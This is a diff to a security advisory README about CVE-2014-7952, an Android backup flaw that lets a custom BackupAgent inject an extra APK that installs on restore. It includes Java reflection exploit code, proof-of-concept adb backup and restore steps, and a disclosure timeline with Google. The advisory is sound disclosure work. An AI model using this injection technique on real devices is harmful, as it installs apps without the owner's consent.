@@ -7,9 +7,9 @@ The Android Operating System offers a backup/restore mechanism of installed pack
 By default, full backup of applications including the private files stored in /data is performed, but this behaviour can be customized by implementing a BackupAgent (http://developer.android.com/reference/android/app/backup/BackupAgent.html) class. This way applications can feed the backup process with custom files and data.
 The backup file created is a simple compressed tar archive with some Android specific headers. Optional encryption is also possible.
 
-APK Injection issue
--------------------
-The backup manager, which invokes the custom BackupAgent's does not filter the data stream returned. A malicious BackupAgent is able to inject additional applications (APKs) into the backup archive, while it is being executed during the backup process without the user's consent. Upon restoration of the backup archive, the system installs the injected, additional application.
+APK injection vulnerability
+---------------------------
+The backup manager, which invokes the custom BackupAgent's does not filter the data stream returned by the applications. While a BackupAgent is being executed during the backup process, it is able to inject additional applications (APKs) into the backup archive without the user's consent. Upon restoration of the backup archive, the system installs the injected, additional application.
 The Backup Manager can be exploited through simple reflection:
 
 ```
@@ -26,8 +26,8 @@ The Backup Manager can be exploited through simple reflection:
 			backupToTar.setAccessible(true);		
 			
 			getData = FullBackupDataOutput.class.getDeclaredMethod("getData");
-			 getData.setAccessible(true);
-			 Object backupData = getData.invoke(data);
+			getData.setAccessible(true);
+			Object backupData = getData.invoke(data);
 			
 			 
 			backupToTar.invoke(null, packageName, null, null, getFilesDir().toString(), getFilesDir()+"/_manifest", backupData);
@@ -49,6 +49,36 @@ The Backup Manager can be exploited through simple reflection:
 		}
 ```
 
+Proof of Concept
+----------------
+In this repository you can find an application along with it's source code which can demonstrate the vulnerabilty.
+It was tested on Android 4.4.4 and Android 5.1.1.
+
+Step 1: Install ADB_Backup_Injection.apk (com.searchlab.backupagenttest):
+![ADB Backup Injection, custom BackupAgent](/relative/path/to/img.jpg?raw=true "ADB Backup Injection, custom BackupAgent")
+
+This application *does not require any permissions*.
+
+Step 2: Use the following command to create a backup of this package
+```
+adb backup -f backup.ab -apk com.searchlab.backupagenttest
+```
+
+Step 3 (optional): If you want to examine the backup archive just created, use the ABE tool [1]:
+```
+java -jar d:\tools\abe\android-backup-extractor-20140630-bin\abe.jar unpack backup.ab backup.tar
+```
+
+In the tar file you will find the injected second application (com.searchlab.wifitest).
+
+Step 4: Use the following command to restore the archive:
+```
+adb restore backup.ab
+```
+
+Step 5: Verify that the Wifi Test application was installed.
+![ADB Backup Injection, injected Application](/relative/path/to/img.jpg?raw=true "ADB Backup Injection, injected Application")
+
 CVE
 ---
 The ID CVE-2014-7952 was assigned to this vulnerability.
@@ -65,3 +95,8 @@ At first, Google did not acknowledge the issue being security relevant. Later th
 2014-07-28: Google refused to treat the issue as a potential threat, but requests to hold off publishing it
 2014-10-15: Google answered that it did not get fixed in the L release and keeps requesting to hold off publishing it
 2015-06-02: Google promised further info in a few days, but it never arrived
+
+
+References
+----------
+1. [ABE](https://github.com/nelenkov/android-backup-extractor)
